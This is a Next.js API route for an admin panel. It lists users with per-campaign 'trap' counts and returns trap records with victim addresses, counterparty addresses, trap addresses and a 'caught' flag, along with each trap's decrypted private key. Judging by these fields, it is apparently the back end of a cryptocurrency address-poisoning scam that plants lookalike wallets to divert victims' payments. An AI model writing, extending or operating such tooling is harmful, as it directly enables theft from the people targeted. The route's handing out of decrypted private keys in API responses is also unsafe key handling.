import { NextRequest, NextResponse } from 'next/server';
import { getAuthUser } from '@/lib/auth';
import { supabaseService } from '@/lib/supabaseService';
import { decrypt } from '@/lib/encryption';

export async function GET(req: NextRequest) {
  try {
    const admin = await getAuthUser();
    if (!admin) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const { data: adminUser } = await supabaseService
      .from('users')
      .select('role')
      .eq('id', admin.id)
      .single();
    if (adminUser?.role !== 'admin') {
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
    }

    const { searchParams } = new URL(req.url);
    const userId = searchParams.get('userId');
    const includeUsers = searchParams.get('includeUsers') === 'true';

    // ─── If includeUsers, return user list with trap counts ───
    if (includeUsers) {
      // 1. Fetch all users
      const { data: users, error: usersError } = await supabaseService
        .from('users')
        .select('id, email')
        .order('email', { ascending: true });

      if (usersError) {
        return NextResponse.json({ error: usersError.message }, { status: 500 });
      }

      // 2. Fetch campaigns with user_id mapping
      const { data: campaigns } = await supabaseService
        .from('campaigns')
        .select('id, user_id');

      const campaignToUser: Record<string, string> = {};
      for (const c of campaigns || []) {
        campaignToUser[c.id] = c.user_id;
      }

      // 3. Count traps per campaign in parallel (bypasses 1000 row limit)
      const campaignIds = Object.keys(campaignToUser);

      const countPromises = campaignIds.map(async (campaignId) => {
        try {
          const { count, error } = await supabaseService
            .from('traps')
            .select('id', { count: 'exact', head: true })
            .eq('campaign_id', campaignId);

          if (error) {
            console.warn(`[admin/traps] Count error for campaign ${campaignId}:`, error.message);
            return { campaignId, count: 0 };
          }
          return { campaignId, count: count || 0 };
        } catch (err) {
          console.error(`[admin/traps] Exception counting campaign ${campaignId}:`, err);
          return { campaignId, count: 0 };
        }
      });

      const countResults = await Promise.all(countPromises);

      // 4. Aggregate per-campaign counts into per-user totals
      const userTrapCounts: Record<string, number> = {};
      for (const { campaignId, count } of countResults) {
        const userIdFromCampaign = campaignToUser[campaignId];
        if (userIdFromCampaign) {
          userTrapCounts[userIdFromCampaign] = (userTrapCounts[userIdFromCampaign] || 0) + count;
        }
      }

      const usersWithCounts = users.map((user: any) => ({
        id: user.id,
        email: user.email,
        trapCount: userTrapCounts[user.id] || 0,
      }));

      return NextResponse.json({ users: usersWithCounts });
    }

    // ─── Otherwise, fetch traps for a specific user (or all) ───
    let query = supabaseService
      .from('traps')
      .select(`
        id,
        victim_address,
        counterparty_address,
        trap_address,
        trap_private_key_enc,
        is_caught,
        created_at,
        campaign_id
      `)
      .order('created_at', { ascending: false });

    if (userId) {
      // Filter by user_id via campaigns table
      const { data: campaigns } = await supabaseService
        .from('campaigns')
        .select('id')
        .eq('user_id', userId);
      const campaignIds = campaigns?.map(c => c.id) || [];
      if (campaignIds.length === 0) {
        return NextResponse.json({ traps: [] });
      }
      query = query.in('campaign_id', campaignIds);
    }

    const { data: traps, error: trapsError } = await query;

    if (trapsError) {
      return NextResponse.json({ error: trapsError.message }, { status: 500 });
    }

    // Fetch campaign details for each trap
    const campaignIds = [...new Set(traps.map(t => t.campaign_id).filter(Boolean))];
    let campaignsMap: Record<string, { chain: string; user_id: string }> = {};
    if (campaignIds.length > 0) {
      const { data: campaigns } = await supabaseService
        .from('campaigns')
        .select('id, chain, user_id')
        .in('id', campaignIds);
      if (campaigns) {
        campaignsMap = campaigns.reduce((acc, c) => {
          acc[c.id] = { chain: c.chain, user_id: c.user_id };
          return acc;
        }, {} as Record<string, any>);
      }
    }

    // Decrypt keys and attach campaign info
    const trapsWithKeys = traps.map((trap: any) => {
      let decryptedKey = null;
      try {
        if (trap.trap_private_key_enc) {
          decryptedKey = decrypt(trap.trap_private_key_enc);
        }
      } catch (e) {
        decryptedKey = 'Error decrypting';
      }

      const campaignInfo = campaignsMap[trap.campaign_id] || { chain: null, user_id: null };

      return {
        ...trap,
        private_key: decryptedKey,
        trap_private_key_enc: undefined,
        campaigns: {
          chain: campaignInfo.chain,
          user_id: campaignInfo.user_id,
        },
      };
    });

    return NextResponse.json({ traps: trapsWithKeys });
  } catch (err) {
    console.error('[admin/traps] Error:', err);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}